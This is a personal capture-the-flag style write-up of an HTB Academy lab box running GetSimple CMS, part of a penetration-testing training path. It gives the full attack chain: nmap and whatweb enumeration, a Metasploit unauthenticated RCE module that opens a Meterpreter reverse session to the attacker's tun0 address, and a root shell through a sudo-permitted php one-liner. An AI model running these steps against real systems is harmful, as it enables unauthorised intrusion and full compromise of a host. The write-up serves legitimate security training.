# HTB Academy — Getting Started (CPTS Path)

**Author:** Taheer Abdullah
**GitHub:** [TaheerAbdullah10]
**LinkedIn:** [https://www.linkedin.com/in/taheer-abdullah-474368419/]
**Date:** October 2026

**Module:** Getting Started
**Path:** Penetration Tester (CPTS)
**Category:** Fundamental — Offensive
**Final Challenge:** Unguided box compromise (GetSimple CMS target)

> © 2026 Taheer Abdullah. This writeup is my own original work, written while completing HTB Academy's CPTS path. Please do not reproduce or republish without credit/permission.

---

## Overview

This module is the first fully hands-on module in HTB Academy's CPTS path. It introduces the complete penetration testing workflow — enumeration, web footprinting, exploit research, exploitation, shell handling, and privilege escalation — through a guided walkthrough of the retired box **Nibbles**, followed by an unguided box to apply the same methodology independently.

This writeup covers the final unguided challenge, where I was given only an IP address and had to work through the full attack chain from scratch.

---

## Enumeration

### Initial Port Scan

```bash
nmap -sV --open -oA initial_scan <target_ip>
```

**Result:**

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.41 (Ubuntu)


Only two ports open — SSH and HTTP. With no obvious SSH vulnerability on a recent OpenSSH version, port 80 became the focus.

### Web Footprinting

```bash
whatweb <target_ip>
```

**Result:**

http://<target_ip> [200 OK] AddThis, Apache[2.4.41], HTML5, Title[Welcome to GetSimple! - gettingstarted]


The page title revealed the actual application running on top of Apache: **GetSimple CMS**. This was the real attack surface — Apache's version alone wasn't the vulnerability, the CMS running on it was.

---

## Exploitation

### Searching for Public Exploits

```bash
searchsploit getsimple
```

This returned a large number of results spanning multiple GetSimple versions (2.01 through 3.3.16+), including XSS, LFI, arbitrary file upload, and RCE vulnerabilities. Two stood out as viable foothold vectors:

- `exploit/multi/http/getsimplecms_unauth_code_exec` — Metasploit module, unauthenticated RCE
- A standalone Python script equivalent of the same vulnerability

I chose the Metasploit route for this engagement.

### Gaining a Foothold

msfconsole
search getsimple
use exploit/multi/http/getsimplecms_unauth_code_exec
set RHOSTS <target_ip>
set LHOST <attacker_tun0_ip>
set LPORT 4444
exploit


**Result:** A Meterpreter session opened as `www-data`.

meterpreter > getuid
Server username: www-data


**Note:** `RHOSTS` is plural in Metasploit — a common typo (`RHOST`) will silently fail option validation. Also critical: `LHOST` must be set to the attacking machine's `tun0` VPN interface IP, not its local/NAT IP, since the target can only route back through the VPN tunnel.

---

## Privilege Escalation

Dropped from Meterpreter into a proper shell:

meterpreter > shell


Ran standard privilege escalation enumeration:

```bash
sudo -l
```

**Result:**

User www-data may run the following commands on gettingstarted:
(ALL : ALL) NOPASSWD: /usr/bin/php


This was the key finding: `www-data` could execute `/usr/bin/php` as root with no password required. Since PHP has a built-in `system()` function capable of executing arbitrary shell commands, and PHP itself was running with root privileges via sudo, this gave a direct path to a root shell.

```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
```

```bash
whoami
# root
```

---

## Flag

```bash
find / -name "user.txt" 2>/dev/null
cat <path_found>
```

Flag retrieved and submitted on the Academy platform.

---

## Lessons Learned

- **Enumeration should be iterative, not a one-shot process.** The Apache version itself wasn't the vulnerability — the CMS running on top of it was. Always look past the web server banner to the actual application.
- **`sudo -l` should be one of the first commands run after any foothold.** If a general-purpose interpreter (PHP, Python, Perl, etc.) is allowed via sudo with `NOPASSWD`, it's very likely exploitable for privilege escalation, since most of these can spawn a shell directly.
- **Metasploit's `RHOSTS` vs `RHOST` typo is an easy mistake** that fails silently rather than throwing an obvious error — worth double-checking `show options` output carefully before running an exploit.
- **`LHOST` must always be the VPN tunnel interface (`tun0`) IP** when working against HTB targets — not the attacking machine's local network IP, since the target has no route back to anything else.
- **Meterpreter's command interpreter is not a full shell** — commands like `sudo` aren't understood directly inside Meterpreter and require dropping into `shell` first.

---

*Written by Taheer Abdullah as part of my CPTS (HTB Certified Penetration Testing Specialist) preparation journey — follow along at [repo link] / [LinkedIn] / [Medium].*
